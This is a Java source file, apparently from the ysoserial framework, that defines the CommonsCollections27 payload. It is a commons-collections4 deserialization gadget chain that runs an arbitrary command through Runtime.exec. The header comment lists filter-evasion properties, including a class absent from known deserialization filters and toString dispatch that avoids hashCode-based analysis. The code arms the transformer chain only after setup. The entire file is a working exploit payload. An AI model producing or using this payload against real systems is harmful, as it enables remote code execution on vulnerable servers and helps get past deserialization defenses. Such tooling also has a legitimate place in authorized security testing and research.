package ysoserial.payloads;

import java.io.Serializable;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.AbstractHashedMap;
import org.apache.commons.collections4.map.CaseInsensitiveMap;
import org.apache.commons.collections4.map.LazyMap;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	CaseInsensitiveMap (CC4) — toString dispatch, NOT hashCode.

	Gadget chain:
		ObjectInputStream.readObject()
			CaseInsensitiveMap.doReadObject()
				CaseInsensitiveMap.put(key, value)
					CaseInsensitiveMap.convertKey(key)
						key.toString()                    ← toString dispatch
							TiedMapEntry.toString()
								TiedMapEntry.getValue()
									LazyMap.get()
										ChainedTransformer.transform()
											InvokerTransformer.transform()
												Method.invoke()
													Runtime.exec()

	CC4 version of CC26. Uses commons-collections4 classes.

	Filter evasion:
		1. CaseInsensitiveMap (o.a.c.c4.map) — not in any known filter
		2. toString() dispatch — bypasses all hashCode-based analysis
		3. CC4-only — for targets with only commons-collections4
		4. No JDK version restriction

	Discovered by IOCD static analysis + differential fuzzing.

	Requires:
		commons-collections4 4.0+
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({ Authors.DMBS335 })
public class CommonsCollections27 extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String command) throws Exception {

		final String[] execArgs = new String[] { command };

		// Inert transformer during setup
		final Transformer[] fakeTransformers = new Transformer[] {
			new ConstantTransformer(1) };
		final ChainedTransformer transformerChain = new ChainedTransformer(fakeTransformers);

		// Real transformers to arm later
		final Transformer[] realTransformers = new Transformer[] {
			new ConstantTransformer(Runtime.class),
			new InvokerTransformer("getMethod", new Class[] {
				String.class, Class[].class }, new Object[] {
				"getRuntime", new Class[0] }),
			new InvokerTransformer("invoke", new Class[] {
				Object.class, Object[].class }, new Object[] {
				null, new Object[0] }),
			new InvokerTransformer("exec",
				new Class[] { String.class }, execArgs),
			new ConstantTransformer(1) };

		final Map innerMap = new HashMap();
		final Map lazyMap = LazyMap.lazyMap(innerMap, transformerChain);

		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

		// CaseInsensitiveMap with dummy entry
		CaseInsensitiveMap caseMap = new CaseInsensitiveMap();
		caseMap.put("dummy", "bar");

		// Access internal data[] (AbstractHashedMap.data = HashEntry[])
		Field dataField = AbstractHashedMap.class.getDeclaredField("data");
		Reflections.setAccessible(dataField);
		Object[] data = (Object[]) dataField.get(caseMap);

		// Replace stored key with TiedMapEntry via reflection
		for (int i = 0; i < data.length; i++) {
			if (data[i] != null) {
				Field keyField = data[i].getClass().getDeclaredField("key");
				Reflections.setAccessible(keyField);
				keyField.set(data[i], entry);
				break;
			}
		}

		// Arm the transformer chain
		Reflections.setFieldValue(transformerChain, "iTransformers", realTransformers);

		return caseMap;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections27.class, args);
	}
}
